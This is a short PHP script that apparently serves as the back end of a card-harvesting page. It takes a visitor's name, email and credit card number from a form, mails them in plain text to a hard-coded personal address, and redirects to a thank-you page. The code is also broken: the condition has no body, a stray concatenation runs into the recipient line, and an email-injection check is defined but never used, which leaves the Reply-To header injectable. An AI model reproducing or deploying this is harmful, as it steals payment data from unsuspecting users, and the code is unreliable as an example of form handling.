<?php
if(!isset($_POST['submit']))

//Variables from index.html
$name = $_POST['vname'];
$visitor_email = $_POST['vemail'];
$card = $_POST['vcreditcard'];

//Composing the email message
$email_from = 'jared.mackay1994@live.com';
$email_subject = "New User Card Details";
$email_body = "You have received card details from the user $name.\n".
    "Here is the credit card number: $card.\n".
    "Visitor Email: $visitor_email. \n".

$to = "jared.mackay1994@live.com";
$headers = "From: $email_from \r\n";
$headers .= "Reply-To: $visitor_email \r\n";

//Sending the email
mail($to,$email_subject,$email_body,$headers);

//Redirect to thank you page.
header('Location: thankyou.html');

//Additional function to validate headers against email injection attempts
function IsInjected($str)
{
  $injections = array('(\n+)',
              '(\r+)',
              '(\t+)',
              '(%0A+)',
              '(%0D+)',
              '(%08+)',
              '(%09+)'
              );
  $inject = join('|', $injections);
  $inject = "/$inject/i";
  if(preg_match($inject,$str))
    {
    return true;
  }
  else
    {
    return false;
  }
}

?>
